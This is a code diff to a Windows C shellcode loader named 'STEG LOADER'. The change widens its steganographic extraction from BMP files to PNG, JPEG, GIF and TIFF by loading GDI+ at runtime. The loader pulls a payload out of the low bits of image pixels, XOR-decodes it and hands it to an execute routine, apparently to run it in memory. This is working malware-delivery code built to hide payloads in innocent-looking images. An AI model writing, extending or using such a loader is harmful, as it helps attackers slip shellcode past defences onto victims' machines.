@@ -14,11 +14,19 @@
 #include <winternl.h>
 #include <stdio.h>
 
-// ---- BMP header structures ----
-#pragma pack(push, 1)
-typedef struct { unsigned short t; unsigned int sz; unsigned short r1,r2; unsigned int off; } BMFH;
-typedef struct { unsigned int sz; int w,h; unsigned short pl,bpp; unsigned int comp,isz; int xpm,ypm; unsigned int cu,ci; } BMIH;
-#pragma pack(pop)
+// ---- GDI+ types (loaded at runtime, no C++ needed) ----
+typedef struct { UINT32 V; void*Cb; BOOL S1,S2; } GpSI;
+typedef struct { INT X,Y,W,H; } GpRect;
+typedef struct { UINT W,H; INT Stride,Fmt; void*Scan0; UINT_PTR R; } GpBD;
+#define PF24 0x00021808
+typedef int(__stdcall*pGdipStart)(ULONG_PTR*,const void*,void*);
+typedef void(__stdcall*pGdipStop)(ULONG_PTR);
+typedef int(__stdcall*pGdipLoad)(const WCHAR*,void**);
+typedef int(__stdcall*pGdipW)(void*,UINT*);
+typedef int(__stdcall*pGdipH)(void*,UINT*);
+typedef int(__stdcall*pGdipLock)(void*,const GpRect*,UINT,int,GpBD*);
+typedef int(__stdcall*pGdipUnlock)(void*,GpBD*);
+typedef int(__stdcall*pGdipDispose)(void*);
 
 // ---- Private LDR entry ----
 typedef struct _GL_LDR_ENTRY {
@@ -257,7 +265,8 @@ static int execute(PVOID entry){
 }
 
 // ============================================================
-//  BMP Steganography — extract shellcode from pixel LSBs
+//  Image Steganography — extract shellcode from pixel LSBs
+//  Supports PNG, BMP, JPEG, GIF, TIFF via GDI+
 // ============================================================
 static void set_bit(unsigned char *data, int pos, int val) {
     int bi = pos / 8, bo = 7 - (pos % 8);
@@ -265,72 +274,68 @@ static void set_bit(unsigned char *data, int pos, int val) {
     else     data[bi] &= ~(1 << bo);
 }
 
-static unsigned char *extract_from_bmp(const char *path, int bpc, size_t *out_len) {
-    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
-                            NULL, OPEN_EXISTING, 0, NULL);
-    if (hf == INVALID_HANDLE_VALUE) return NULL;
+static unsigned char *extract_from_image(const char *path, int bpc, size_t *out_len) {
+    HMODULE gdi = LoadLibraryA("gdiplus.dll");
+    if (!gdi) return NULL;
+    pGdipStart  _Start  = (pGdipStart)GetProcAddress(gdi, "GdiplusStartup");
+    pGdipStop   _Stop   = (pGdipStop)GetProcAddress(gdi, "GdiplusShutdown");
+    pGdipLoad   _Load   = (pGdipLoad)GetProcAddress(gdi, "GdipCreateBitmapFromFile");
+    pGdipW      _GetW   = (pGdipW)GetProcAddress(gdi, "GdipGetImageWidth");
+    pGdipH      _GetH   = (pGdipH)GetProcAddress(gdi, "GdipGetImageHeight");
+    pGdipLock   _Lock   = (pGdipLock)GetProcAddress(gdi, "GdipBitmapLockBits");
+    pGdipUnlock _Unlk   = (pGdipUnlock)GetProcAddress(gdi, "GdipBitmapUnlockBits");
+    pGdipDispose _Disp  = (pGdipDispose)GetProcAddress(gdi, "GdipDisposeImage");
+    if (!_Start||!_Stop||!_Load||!_GetW||!_GetH||!_Lock||!_Unlk||!_Disp) return NULL;
 
-    DWORD fsz = GetFileSize(hf, NULL);
-    BYTE *bmp = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fsz);
-    DWORD rd = 0;
-    ReadFile(hf, bmp, fsz, &rd, NULL);
-    CloseHandle(hf);
+    GpSI si = {1,NULL,FALSE,FALSE}; ULONG_PTR tok;
+    if (_Start(&tok, &si, NULL) != 0) return NULL;
 
-    BMFH *fh = (BMFH*)bmp;
-    BMIH *ih = (BMIH*)(bmp + sizeof(BMFH));
+    WCHAR wPath[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, path, -1, wPath, MAX_PATH);
 
-    if (fh->t != 0x4D42 || ih->bpp != 24 || ih->comp != 0) {
-        HeapFree(GetProcessHeap(), 0, bmp);
-        return NULL;
-    }
+    void *bmp = NULL;
+    if (_Load(wPath, &bmp) != 0 || !bmp) { _Stop(tok); return NULL; }
 
-    BYTE *pixels = bmp + fh->off;
-    long pixel_bytes = fsz - fh->off;
-    unsigned char mask = (1 << bpc) - 1;
+    UINT w = 0, h = 0;
+    _GetW(bmp, &w); _GetH(bmp, &h);
 
-    // First extract 4 bytes (length header)
+    GpRect rc = {0, 0, (INT)w, (INT)h};
+    GpBD bd = {0};
+    if (_Lock(bmp, &rc, 1, PF24, &bd) != 0) { _Disp(bmp); _Stop(tok); return NULL; }
+
+    long pixel_bytes = (long)(abs(bd.Stride) * h);
+    BYTE *pixels = (BYTE*)HeapAlloc(GetProcessHeap(), 0, pixel_bytes);
+    memcpy(pixels, bd.Scan0, pixel_bytes);
+    _Unlk(bmp, &bd); _Disp(bmp); _Stop(tok); FreeLibrary(gdi);
+
+    // Extract 4-byte length header
     unsigned char hdr[4] = {0};
     int data_bit = 0;
-
     for (long i = 0; i < pixel_bytes && data_bit < 32; i++) {
         for (int b = bpc - 1; b >= 0; b--) {
-            if (data_bit < 32) {
-                set_bit(hdr, data_bit, (pixels[i] >> b) & 1);
-                data_bit++;
-            }
+            if (data_bit < 32) { set_bit(hdr, data_bit, (pixels[i] >> b) & 1); data_bit++; }
         }
     }
 
-    size_t sc_len = ((size_t)hdr[0] << 24) | ((size_t)hdr[1] << 16) |
-                    ((size_t)hdr[2] << 8)  |  (size_t)hdr[3];
-
-    if (sc_len == 0 || sc_len > 50000000) {
-        HeapFree(GetProcessHeap(), 0, bmp);
-        return NULL;
-    }
+    size_t sc_len = ((size_t)hdr[0]<<24)|((size_t)hdr[1]<<16)|((size_t)hdr[2]<<8)|(size_t)hdr[3];
+    if (sc_len == 0 || sc_len > 50000000) { HeapFree(GetProcessHeap(),0,pixels); return NULL; }
 
     // Extract full payload
     size_t total = 4 + sc_len;
-    unsigned char *data = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
-    data_bit = 0;
-    long total_bits = (long)total * 8;
-
+    unsigned char *edata = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
+    data_bit = 0; long total_bits = (long)total * 8;
     for (long i = 0; i < pixel_bytes && data_bit < total_bits; i++) {
         for (int b = bpc - 1; b >= 0; b--) {
-            if (data_bit < total_bits) {
-                set_bit(data, data_bit, (pixels[i] >> b) & 1);
-                data_bit++;
-            }
+            if (data_bit < total_bits) { set_bit(edata, data_bit, (pixels[i] >> b) & 1); data_bit++; }
         }
     }
+    HeapFree(GetProcessHeap(), 0, pixels);
 
-    HeapFree(GetProcessHeap(), 0, bmp);
-
-    // Skip 4-byte header, return shellcode
     unsigned char *sc = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, sc_len);
-    memcpy(sc, data + 4, sc_len);
-    HeapFree(GetProcessHeap(), 0, data);
+    memcpy(sc, edata + 4, sc_len);
+    HeapFree(GetProcessHeap(), 0, edata);
 
+    printf("[+] %ux%u | Extracted %zu bytes from pixels\n", w, h, sc_len);
     *out_len = sc_len;
     return sc;
 }
@@ -341,7 +346,7 @@ static unsigned char *extract_from_bmp(const char *path, int bpc, size_t *out_le
 int main(int argc, char *argv[]) {
     if (argc < 2) {
         printf("STEG LOADER — Shellcode from image\n\n");
-        printf("Usage: %s <image.bmp> [-x xor_key] [-b bits]\n", argv[0]);
+        printf("Usage: %s <image.png> [-x xor_key] [-b bits]\n", argv[0]);
         printf("\n  -x    XOR decode key (0-255)\n");
         printf("  -b    Bits per channel (default 2)\n");
         return 1;
@@ -359,15 +364,13 @@ int main(int argc, char *argv[]) {
 
     printf("\033[31m#Made By Worry.\033[0m\n\n");
 
-    // 1. Extract shellcode from image
-    printf("[+] Extracting from image...\n");
+    // 1. Extract shellcode from image via GDI+
     size_t sc_len = 0;
-    unsigned char *sc = extract_from_bmp(bmp_path, bpc, &sc_len);
+    unsigned char *sc = extract_from_image(bmp_path, bpc, &sc_len);
     if (!sc) {
         printf("[-] Extraction failed: %s\n", bmp_path);
         return 1;
     }
-    printf("[+] Extracted %zu bytes from pixels\n", sc_len);
 
     // XOR decode
     if (xor_key >= 0 && xor_key <= 255) {
